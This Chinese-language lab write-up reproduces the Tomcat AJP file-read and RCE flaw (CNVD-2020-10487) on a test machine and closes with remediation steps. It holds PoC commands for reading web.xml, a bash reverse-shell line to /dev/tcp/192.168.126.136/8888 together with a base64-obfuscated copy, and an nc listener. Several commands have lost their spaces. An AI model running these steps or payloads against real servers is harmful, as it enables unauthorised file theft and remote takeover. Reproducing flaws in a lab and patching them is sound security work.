## 0x00 简介

Tomcat在server.xml中配置有HTTP连接器和AJP连接器，AJP连接器可以通过AJP协议与另一个web容器进行交互。AJP协议是定向包协议，其使用端口为8009端口，为提高性能，AJP协议采用二进制形势代替文本形势。

## 0x01漏洞简介

在2020年2月20日，CNVD发布了漏洞公告。该漏洞是Tomcat
AJP协议存在缺陷而导致，攻击者可以通过构造特定的参数，读取tomcat的webapps/ROOT目录下的任意文件。同时，若该服务器存在文件上传功能，攻击者还可以进一步实现远程代码执行。

## 0x02 影响版本

> ApacheTomcat6  
> ​ApacheTomcat7<7.0.100  
> ​ApacheTomcat8<8.5.51  
> ​ApacheTomcat9<9.0.31

## 0x03 环境搭建

本次测试使用 kali 20.4版本，tomcat 为8.5.50版本

搭建好 tomcat 的环境

![20210813172456.png](https://image.3001.net/images/20210827/1630045519_6128854f913f01d81562b.png!small)

本次测试使用 python2.7 版本并已配置相应 pip

> python --version  
> pip2 --version

![20210813172713.png](https://image.3001.net/images/20210827/1630045521_6128855118a6c6e8887eb.png!small)

开启tomcat服务器，并检查8009端口是否开启

  

> nmap -p80009ip

![20210813160919.png](https://image.3001.net/images/20210827/1630045521_61288551f1629b8ca5276.png!small)

![20210813160939.png](https://image.3001.net/images/20210827/1630045523_6128855306f132942c8bd.png!small)

## 0x04 任意文件漏洞复现

poc链接：<https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC>

进入poc目录下执行以下指令安装依赖包

> pip install -rrequirements.txt

![20210811221141.png](https://image.3001.net/images/20210827/1630045524_61288554309a9e6b4ca9a.png!small)

执行以下指令进行文件读取，-p 接目标系统开放的端口，最后跟上目标靶机的 IP

> python poc.py -p8009-f"/WEB-INF/web.xml"127.0.0.1

![20210813161030.png](https://image.3001.net/images/20210827/1630045525_6128855559cf423914de5.png!small)

执行以下指令查看 Tomcat 的 webapps/ROOT 目录

> cdROOT  
> ls-l

结果如下图所示：

![20210813161100.png](https://image.3001.net/images/20210827/1630045526_61288556f1759c13c857c.png!small)

## 0x05 文件包含致RCE漏洞复现

构造payload，并将 payload 放置在 webapps/ROOT 目录下

![20210813163101.png](https://image.3001.net/images/20210827/1630045528_612885585db1d4b9daf94.png!small)

1.txt 文件内容如下：

![20210813180641.png](https://image.3001.net/images/20210827/1630045529_61288559ad565f0e718a1.png!small)

其中第一行 exec 包含的就是我们构造的指令

这里的bash指令是由 [在线生成器](http://www.jackson-t.ca/runtime-exec-payloads.html)生成

> # raw：  
> bash-i>& /dev/tcp/192.168.126.136/8888 0>&1  
> # after confusion  
>
> bash-c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyNi4xMzYvODg4OCAwPiYx}|{base64,-d}|{bash,-i}

![20210815171805.png](https://image.3001.net/images/20210827/1630045530_6128855abbc0561608b28.png!small)

在webapps/ROOT下开启本地监听

> nc-lvnp8888

![20210813163114.png](https://image.3001.net/images/20210827/1630045531_6128855b667b693fa1c18.png!small)

执行以下指令运行 poc

> python poc.py -p8009-f1.txt 127.0.0.1

![20210813163200.png](https://image.3001.net/images/20210827/1630045532_6128855c54018c98ea3c8.png!small)

成功反弹shell

> whoami  
> dir

![20210813163215.png](https://image.3001.net/images/20210827/1630045533_6128855d6f5645ecf32e4.png!small)

## 0x06 漏洞修复

1.临时禁用AJP协议端口：在 conf/server.xml 配置文件中注释掉117行的 <Connector port="8009"
protocol="AJP/1.3"redirectPort="8443" /> ，然后重启服务器。

2.官方已发布新版本完成漏洞修复，下载新版本即可。

